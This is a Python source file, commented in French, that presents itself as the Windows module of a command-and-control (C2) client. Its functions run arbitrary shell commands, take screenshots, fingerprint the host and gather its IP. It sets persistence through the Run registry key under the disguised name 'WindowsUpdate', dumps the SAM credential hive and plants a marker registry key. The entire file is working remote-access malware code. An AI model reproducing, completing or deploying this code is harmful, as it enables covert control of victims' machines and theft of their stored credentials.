# Module Windows pour le client C2

import subprocess
import platform
import socket
import os
import io
import sys
import winreg
from PIL import ImageGrab


def run_shell(command):
    result = subprocess.run(
        command, shell=True,
        capture_output=True, text=True, timeout=30
    )
    return {
        "status": "ok",
        "output": result.stdout + result.stderr,
        "returncode": result.returncode
    }


def take_screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def get_sysinfo():
    return {
        "os": platform.system(),
        "version": platform.version(),
        "hostname": platform.node(),
        "username": os.getenv("USERNAME", "?"),
        "processor": platform.processor()
    }


def get_real_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def install_persistence():
    exe = sys.executable
    script = os.path.abspath(sys.argv[0])
    args = " ".join(sys.argv[1:])
    cmd = f'"{exe}" "{script}" {args}'

    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)
    return {"status": "ok", "message": "Persistence installee"}


def dump_sam():
    result = subprocess.run("reg save HKLM\\SAM sam_dump.hive /y",shell=True, capture_output=True, text=True)

    
    if result.returncode == 0:
        return {"status": "ok", "message": "SAM sauvegarde dans sam_dump.hive"}
    return {"status": "error", "message": "Acces refuse jcrois, il faut les droits admin"}


def add_registry_key():
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\C2")
    winreg.SetValueEx(key, "installed", 0, winreg.REG_SZ, "true")
    winreg.CloseKey(key)
    return {"status": "ok", "message": "Cle ajoutee: HKCU\\Software\\C2"}
